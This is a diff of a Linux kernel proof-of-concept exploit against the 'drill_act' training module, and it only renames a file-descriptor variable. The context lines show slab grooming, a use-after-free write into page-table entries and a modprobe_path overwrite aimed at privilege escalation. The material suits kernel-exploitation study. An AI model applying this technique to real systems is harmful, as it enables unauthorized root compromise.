@@ -246,7 +246,7 @@ int prepare_tables()
 	return 0;
 }
 
-long UAF_write(long phys_addr, long uaf_n, long fd)
+long UAF_write(long phys_addr, long uaf_n, long act_fd)
 {
 	int ret;
 	char data_for_drill[16];
@@ -256,7 +256,7 @@ long UAF_write(long phys_addr, long uaf_n, long fd)
 	snprintf(data_for_drill, sizeof(data_for_drill),
 			 "0x%08lx" " %d", phys_addr + flags, 0);
 	 /* switch object each 64 bytes */
-	ret = act(fd, DRILL_ACT_SAVE_VAL, uaf_n, data_for_drill);
+	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, data_for_drill);
 	if (ret == EXIT_FAILURE)
 		exit(EXIT_FAILURE);
 
@@ -310,7 +310,7 @@ void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len,
 int main(void)
 {
 	int ret = EXIT_FAILURE;
-	int fd = -1;
+	int act_fd = -1;
 	long i = 0;
 	long current_n = 0;
 	long reserved_from_n = 0;
@@ -320,8 +320,8 @@ int main(void)
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
 
-	fd = open("/proc/drill_act", O_WRONLY);
-	if (fd < 0) {
+	act_fd = open("/proc/drill_act", O_WRONLY);
+	if (act_fd < 0) {
 		perror("[-] open drill_act");
 		goto end;
 	}
@@ -339,7 +339,7 @@ int main(void)
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
-		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
 		}
@@ -350,7 +350,7 @@ int main(void)
 
 	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
 	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
-		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
 		}
@@ -360,7 +360,7 @@ int main(void)
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
-		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
 		}
@@ -374,7 +374,7 @@ int main(void)
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
-		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
 		}
@@ -386,7 +386,7 @@ int main(void)
 	current_n--; /* point to the last allocated */
 	current_n--; /* don't free the last allocated to keep this active slab */
 	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
-		if (act(fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_FREE\n");
 			goto end;
 		}
@@ -397,7 +397,7 @@ int main(void)
 
 	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
 	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
-		if (act(fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_FREE\n");
 			goto end;
 		}
@@ -418,7 +418,7 @@ int main(void)
 
 	long phys_addr = MODPROBE_ADDR_ALIGNED;
 	/* doing rewrite to change pagetable entries */
-	UAF_write(phys_addr, uaf_n, fd);
+	UAF_write(phys_addr, uaf_n, act_fd);
 	flush_tlb(PTI_TO_VIRT(1, 0, 1, 0, 0),0x200000); /* 0x200000 = 4 KiB per 512 pages */
 
 	for (int i = 0; i < ENTRIES_AMOUNT; i++) {
@@ -446,11 +446,11 @@ int main(void)
 end:
 	printf("[!] finishing this PoC exploit\n");
 
-	if (fd >= 0) {
-		ret = close(fd);
+	if (act_fd >= 0) {
+		ret = close(act_fd);
 		if (ret != 0)
-			perror("[-] close fd");
-		printf("  closed the drill_act fd\n");
+			perror("[-] close act_fd");
+		printf("  closed the drill_act act_fd\n");
 	}
 
 	return ret;
